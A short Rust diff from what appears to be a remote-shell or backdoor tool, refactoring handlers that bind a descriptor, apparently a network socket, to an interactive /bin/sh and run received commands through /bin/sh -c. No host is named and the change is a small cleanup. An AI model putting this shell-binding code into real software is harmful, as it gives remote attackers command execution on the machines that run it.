@@ -1,23 +1,18 @@
 use nix::unistd::{dup2, execv};
 use std::ffi::CString;
 use std::env::args;
-use crate::util::c_str;
+use crate::util::{c_str, init_io};
 use std::process::Command;
 
 pub fn shell(fd: i32, _params: &[&str]) -> String {
-    dup2(fd, 0);
-    dup2(fd, 1);
-    dup2(fd, 2);
+    init_io(fd);
     execv(&c_str("/bin/sh"),
           &[&c_str(&args().collect::<Vec<String>>()[0]), &c_str("-i")]);
     "".to_string()
 }
 
 pub fn cmd(fd: i32, params: &[&str]) -> String {
-    println!("Received params: {}", params.join(" "));
-    dup2(fd, 0);
-    dup2(fd, 1);
-    dup2(fd, 2);
+    init_io(fd);
     // buggy, skip
     //let result = Command::new("/bin/sh").arg("-c").arg(params.join(" ")).output().unwrap();
     let result = Command::new("/bin/sh").arg("-c").arg(params.join(" ")).spawn().unwrap();
